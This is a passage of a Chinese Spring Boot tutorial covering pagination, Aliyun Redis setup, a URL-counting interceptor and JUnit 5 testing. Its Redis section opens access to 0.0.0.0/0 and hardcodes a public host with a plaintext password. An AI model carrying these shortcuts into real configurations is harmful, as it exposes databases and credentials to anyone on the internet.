class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/dynamic_table(pn=$&#123;num&#125;)&#125;&quot;</span>&gt;</span>[[$&#123;num&#125;]]<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;next disabled&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>下一页 → <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>#numbers</code>表示methods for formatting numeric objects.<a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#expression-utility-objects">link</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user/delete/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">deleteUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestParam(value = &quot;pn&quot;,defaultValue = &quot;1&quot;)</span>Integer pn,</span><br><span class="hljs-params">                         RedirectAttributes ra)</span>&#123;<br><br>    userService.removeById(id);<br><br>    ra.addAttribute(<span class="hljs-string">&quot;pn&quot;</span>,pn);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/dynamic_table&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;/dynamic_table&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">dynamic_table</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value=&quot;pn&quot;,defaultValue = &quot;1&quot;)</span> Integer pn,Model model)</span>&#123;<br>    <span class="hljs-comment">//表格内容的遍历</span><br><br>    <span class="hljs-comment">//从数据库中查出user表中的用户进行展示</span><br><br>    <span class="hljs-comment">//构造分页参数</span><br>    Page&lt;User&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(pn, <span class="hljs-number">2</span>);<br>    <span class="hljs-comment">//调用page进行分页</span><br>    Page&lt;User&gt; userPage = userService.page(page, <span class="hljs-literal">null</span>);<br><br>    model.addAttribute(<span class="hljs-string">&quot;users&quot;</span>,userPage);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;table/dynamic_table&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="69、数据访问-准备阿里云Redis环境"><a href="#69、数据访问-准备阿里云Redis环境" class="headerlink" title="69、数据访问-准备阿里云Redis环境"></a>69、数据访问-准备阿里云Redis环境</h2><p><strong>添加依赖</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--导入jedis--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>redis.clients<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jedis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>RedisAutoConfiguration</code>自动配置类，RedisProperties 属性类 –&gt; spring.redis.xxx是对redis的配置。</li><li>连接工厂<code>LettuceConnectionConfiguration</code>、<code>JedisConnectionConfiguration</code>是准备好的。</li><li>自动注入了<code>RedisTemplate&lt;Object, Object&gt;</code>，<code>xxxTemplate</code>。</li><li>自动注入了<code>StringRedisTemplate</code>，key，value都是String</li><li>底层只要我们使用<code>StringRedisTemplate</code>、<code>RedisTemplate</code>就可以操作Redis。</li></ul><p><strong>外网Redis环境搭建</strong>：</p><ol><li><p>阿里云按量付费Redis，其中选择<strong>经典网络</strong>。</p></li><li><p>申请Redis的公网连接地址。</p></li><li><p>修改白名单，允许<code>0.0.0.0/0</code>访问。</p></li></ol><h2 id="70、数据访问-Redis操作与统计小实验"><a href="#70、数据访问-Redis操作与统计小实验" class="headerlink" title="70、数据访问-Redis操作与统计小实验"></a>70、数据访问-Redis操作与统计小实验</h2><p>相关Redis配置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">spring:<br>  redis:<br>#   url: redis:<span class="hljs-comment">//lfy:Lfy123456@r-bp1nc7reqesxisgxpipd.redis.rds.aliyuncs.com:6379</span><br>    host: r-bp1nc7reqesxisgxpipd.redis.rds.aliyuncs.com<br>    port: <span class="hljs-number">6379</span><br>    password: lfy:Lfy123456<br>    client-type: jedis<br>    jedis:<br>      pool:<br>        max-active: <span class="hljs-number">10</span><br>#   lettuce:# 另一个用来连接redis的java框架<br>#      pool:<br>#        max-active: <span class="hljs-number">10</span><br>#        min-idle: <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>测试Redis连接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Boot05WebAdminApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    StringRedisTemplate redisTemplate;<br><br><br>    <span class="hljs-meta">@Autowired</span><br>    RedisConnectionFactory redisConnectionFactory;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testRedis</span><span class="hljs-params">()</span>&#123;<br>        ValueOperations&lt;String, String&gt; operations = redisTemplate.opsForValue();<br><br>        operations.set(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> operations.get(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(hello);<br><br>        System.out.println(redisConnectionFactory.getClass());<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Redis Desktop Manager：可视化Redis管理软件。</p><p>URL统计拦截器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisUrlCountInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    StringRedisTemplate redisTemplate;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br><br>        <span class="hljs-comment">//默认每次访问当前uri就会计数+1</span><br>        redisTemplate.opsForValue().increment(uri);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注册URL统计拦截器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminWebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    RedisUrlCountInterceptor redisUrlCountInterceptor;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br><br>        registry.addInterceptor(redisUrlCountInterceptor)<br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)<br>                .excludePathPatterns(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;/login&quot;</span>,<span class="hljs-string">&quot;/css/**&quot;</span>,<span class="hljs-string">&quot;/fonts/**&quot;</span>,<span class="hljs-string">&quot;/images/**&quot;</span>,<br>                        <span class="hljs-string">&quot;/js/**&quot;</span>,<span class="hljs-string">&quot;/aa/**&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Filter、Interceptor 几乎拥有相同的功能？</p><ul><li>Filter是Servlet定义的原生组件，它的好处是脱离Spring应用也能使用。</li><li>Interceptor是Spring定义的接口，可以使用Spring的自动装配等功能。</li></ul><p>调用Redis内的统计数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br><br><span class="hljs-meta">@Autowired</span><br>    StringRedisTemplate redisTemplate;<br>    <br><span class="hljs-meta">@GetMapping(&quot;/main.html&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">mainPage</span><span class="hljs-params">(HttpSession session,Model model)</span>&#123;<br><br>        log.info(<span class="hljs-string">&quot;当前方法是：&#123;&#125;&quot;</span>,<span class="hljs-string">&quot;mainPage&quot;</span>);<br><br>        ValueOperations&lt;String, String&gt; opsForValue =<br>                redisTemplate.opsForValue();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> opsForValue.get(<span class="hljs-string">&quot;/main.html&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> opsForValue.get(<span class="hljs-string">&quot;/sql&quot;</span>);<br><br>        model.addAttribute(<span class="hljs-string">&quot;mainCount&quot;</span>,s);<br>        model.addAttribute(<span class="hljs-string">&quot;sqlCount&quot;</span>,s1);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;main&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="71、单元测试-JUnit5简介"><a href="#71、单元测试-JUnit5简介" class="headerlink" title="71、单元测试-JUnit5简介"></a>71、单元测试-JUnit5简介</h2><p><strong>Spring Boot 2.2.0 版本开始引入 JUnit 5 作为单元测试默认库</strong></p><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-annotations">JUnit 5官方文档</a></p><p>作为最新版本的JUnit框架，JUnit5与之前版本的JUnit框架有很大的不同。由三个不同子项目的几个不同模块组成。</p><p><strong>JUnit 5 &#x3D; JUnit Platform + JUnit Jupiter + JUnit Vintage</strong></p><ul><li><p><strong>JUnit Platform</strong>: Junit Platform是在JVM上启动测试框架的基础，不仅支持Junit自制的测试引擎，其他测试引擎也都可以接入。</p></li><li><p><strong>JUnit Jupiter</strong>: JUnit Jupiter提供了JUnit5的新的编程模型，是JUnit5新特性的核心。内部包含了一个<strong>测试引擎</strong>，用于在Junit Platform上运行。</p></li><li><p><strong>JUnit Vintage</strong>: 由于JUint已经发展多年，为了照顾老的项目，JUnit Vintage提供了兼容JUnit4.x，JUnit3.x的测试引擎。</p></li></ul><p><strong>注意</strong>：</p><ul><li><p>SpringBoot 2.4 以上版本移除了默认对 Vintage 的依赖。如果需要兼容JUnit4需要自行引入（不能使用JUnit4的功能 @Test）</p></li><li><p>JUnit 5’s Vintage已经从<code>spring-boot-starter-test</code>从移除。如果需要继续兼容Junit4需要自行引入Vintage依赖：</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.junit.vintage<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit-vintage-engine<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.hamcrest<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hamcrest-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>使用添加JUnit 5，添加对应的starter：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>Spring的JUnit 5的基本单元测试模板（Spring的JUnit4的是<code>@SpringBootTest</code>+<code>@RunWith(SpringRunner.class)</code>）：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.junit.jupiter.api.Assertions;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<span class="hljs-comment">//注意不是org.junit.Test（这是JUnit4版本的）</span><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringBootApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Component component;<br>    <br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-comment">//@Transactional 标注后连接数据库有回滚功能</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br>Assertions.assertEquals(<span class="hljs-number">5</span>, component.getFive());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Jupiter</p><p>英 [ˈdʒuːpɪtə(r)]   美 [ˈdʒuːpɪtər]</p><p>n. 木星(太阳系中最大的行星)</p></blockquote><blockquote><p>vintage</p><p>英 [ˈvɪntɪdʒ]   美 [ˈvɪntɪdʒ]</p><p>n. 特定年份(或地方)酿制的酒;酿造年份;采摘葡萄酿酒的期间(或季节);葡萄收获期(或季节)</p><p>adj. (指葡萄酒)优质的，上等的，佳酿的;古色古香的(指1917–1930年间制造，车型和品味受人青睐的);(过去某个时期)典型的，优质的;(某人的)最佳作品的</p></blockquote><h2 id="72、单元测试-常用测试注解"><a href="#72、单元测试-常用测试注解" class="headerlink" title="72、单元测试-常用测试注解"></a>72、单元测试-常用测试注解</h2><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-annotations">官方文档 - Annotations</a></p><ul><li><strong>@Test</strong>：表示方法是测试方法。但是与JUnit4的@Test不同，他的职责非常单一不能声明任何属性，拓展的测试将会由Jupiter提供额外测试</li><li><strong>@ParameterizedTest</strong>：表示方法是参数化测试。</li><li><strong>@RepeatedTest</strong>：表示方法可重复执行。</li><li><strong>@DisplayName</strong>：为测试类或者测试方法设置展示名称。</li><li><strong>@BeforeEach</strong>：表示在<strong>每个</strong>单元测试<strong>之前</strong>执行。</li><li><strong>@AfterEach</strong>：表示在<strong>每个</strong>单元测试<strong>之后</strong>执行。</li><li><strong>@BeforeAll</strong>：表示在<strong>所有</strong>单元测试<strong>之前</strong>执行。</li><li><strong>@AfterAll</strong>：表示在<strong>所有</strong>单元测试<strong>之后</strong>执行。</li><li><strong>@Tag</strong>：表示单元测试类别，类似于JUnit4中的@Categories。</li><li><strong>@Disabled</strong>：表示测试类或测试方法不执行，类似于JUnit4中的@Ignore。</li><li><strong>@Timeout</strong>：表示测试方法运行如果超过了指定时间将会返回错误。</li><li><strong>@ExtendWith</strong>：为测试类或测试方法提供扩展类引用。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.junit.jupiter.api.*;<br><br><span class="hljs-meta">@DisplayName(&quot;junit5功能测试类&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Junit5Test</span> &#123;<br><br><br>    <span class="hljs-meta">@DisplayName(&quot;测试displayname注解&quot;)</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDisplayName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">1</span>);<br>        System.out.println(jdbcTemplate);<br>    &#125;<br>    <br>    <span class="hljs-meta">@ParameterizedTest</span><br>    <span class="hljs-meta">@ValueSource(strings = &#123; &quot;racecar&quot;, &quot;radar&quot;, &quot;able was I ere I saw elba&quot; &#125;)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">palindromes</span><span class="hljs-params">(String candidate)</span> &#123;<br>        assertTrue(StringUtils.isPalindrome(candidate));<br>    &#125;<br>    <br><br>    <span class="hljs-meta">@Disabled</span><br>    <span class="hljs-meta">@DisplayName(&quot;测试方法2&quot;)</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@RepeatedTest(5)</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">5</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 规定方法超时时间。超出时间测试出异常</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> InterruptedException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Timeout(value = 500, unit = TimeUnit.MILLISECONDS)</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        Thread.sleep(<span class="hljs-number">600</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@BeforeEach</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testBeforeEach</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;测试就要开始了...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@AfterEach</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAfterEach</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;测试结束了...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@BeforeAll</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testBeforeAll</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;所有测试就要开始了...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@AfterAll</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAfterAll</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;所有测试以及结束了...&quot;</span>);<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="73、单元测试-断言机制"><a href="#73、单元测试-断言机制" class="headerlink" title="73、单元测试-断言机制"></a>73、单元测试-断言机制</h2><p>断言Assertion是测试方法中的核心部分，用来对测试需要满足的条件进行验证。这些断言方法都是org.junit.jupiter.api.Assertions的静态方法。检查业务逻辑返回的数据是否合理。所有的测试运行结束以后，会有一个详细的测试报告。</p><p>JUnit 5 内置的断言可以分成如下几个类别：</p><h3 id="简单断言"><a href="#简单断言" class="headerlink" title="简单断言"></a>简单断言</h3><p>用来对单个值进行简单的验证。如：</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>assertEquals</td><td>判断两个对象或两个原始类型是否相等</td></tr><tr><td>assertNotEquals</td><td>判断两个对象或两个原始类型是否不相等</td></tr><tr><td>assertSame</td><td>判断两个对象引用是否指向同一个对象</td></tr><tr><td>assertNotSame</td><td>判断两个对象引用是否指向不同的对象</td></tr><tr><td>assertTrue</td><td>判断给定的布尔值是否为 true</td></tr><tr><td>assertFalse</td><td>判断给定的布尔值是否为 false</td></tr><tr><td>assertNull</td><td>判断给定的对象引用是否为 null</td></tr><tr><td>assertNotNull</td><td>判断给定的对象引用是否不为 null</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;simple assertion&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simple</span><span class="hljs-params">()</span> &#123;<br>     assertEquals(<span class="hljs-number">3</span>, <span class="hljs-number">1</span> + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;simple math&quot;</span>);<br>     assertNotEquals(<span class="hljs-number">3</span>, <span class="hljs-number">1</span> + <span class="hljs-number">1</span>);<br><br>     assertNotSame(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>     assertSame(obj, obj);<br><br>     assertFalse(<span class="hljs-number">1</span> &gt; <span class="hljs-number">2</span>);<br>     assertTrue(<span class="hljs-number">1</span> &lt; <span class="hljs-number">2</span>);<br><br>     assertNull(<span class="hljs-literal">null</span>);<br>     